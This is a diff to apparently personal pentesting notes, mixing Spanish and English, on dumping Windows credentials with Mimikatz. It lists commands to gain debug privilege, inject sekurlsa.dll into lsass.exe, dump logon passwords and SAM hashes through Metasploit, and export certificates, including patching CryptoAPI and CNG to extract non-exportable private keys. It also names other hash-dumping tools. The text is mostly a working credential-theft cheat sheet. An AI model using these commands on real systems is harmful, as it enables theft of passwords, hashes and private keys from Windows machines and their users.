@@ -21,7 +21,7 @@ Dumping Hashes
 
 """"""""""""""""""""""""""""""""""""""""""""""""""Mimikatz"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 >>mimikatz.exe
->>privilege::debug
+>>privilege::debug                             //nos da privilegios sobre LSA
 >>sekurlsa::logonpasswords
 ...................muchos hashes y passwords...........
 
@@ -36,8 +36,8 @@ c:\AlgunLugarEscondido > mimikatz.exe
 
 To run mimikatz you well need mimikatz.exe and sekurlsa.dll on the system you're targeting. 
 privilege::debug
-inject::process lsass.exe sekurlsa.dll
-getLogonPasswords
+inject::process lsass.exe sekurlsa.dll                   / or  inject::service samss sekurlsa.dll
+@getLogonPasswords full
 sekurlsa::logonpasswords full
 
 Opcion 2) Use the mimikatz build-in on metasploit
@@ -64,6 +64,19 @@ Opcion 2) Use the mimikatz build-in on metasploit
 
 >>mimikatz_command -f samdump::hashes
 
+>>mimikatz_command -f crypto::listStores CERT_SYSTE_STORE_CURRENT_USER       //lista contenedores de certificados
+                                         CERT_SYSTEM_STORE_LOCAL_MACHINE
+                                         CERT_SYSTEM_STORE_CURRENT_SERVICE
+                                         CERT_SYSTEM_STORE_SERVICES
+                                         CERT_SYSTEM_STORES_USERS
+                                         CERT_SYSTEM_CURRENT_USER_GROUP_POLICY
+                                         CERT_SYSTEM_LOCAL_MACHINE_GROUP_POLICY
+                                         CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE
+>>mimikatz_command -f crypto::listCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"   //lista certificados de un contenedor
+>>mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"  //exporta los certificados
+Nota: en caso de que un certificado no permita ser exportado deberíamos parchear la CryptoAPI o el servicio de aislamiento
+de claves CNG. >>crypto::patchapi   o   >>crypto::patchcng
+>>mimikatz_command -f crypto::listProviders
 
 Otras herramientas para Dump'ear hashes: Gsecdump.exe / Pwdump7 / Metasploit hashdump / 
       herramienta online para generar hashes: http://www.sinfocol.org/herramientas/hashes.php
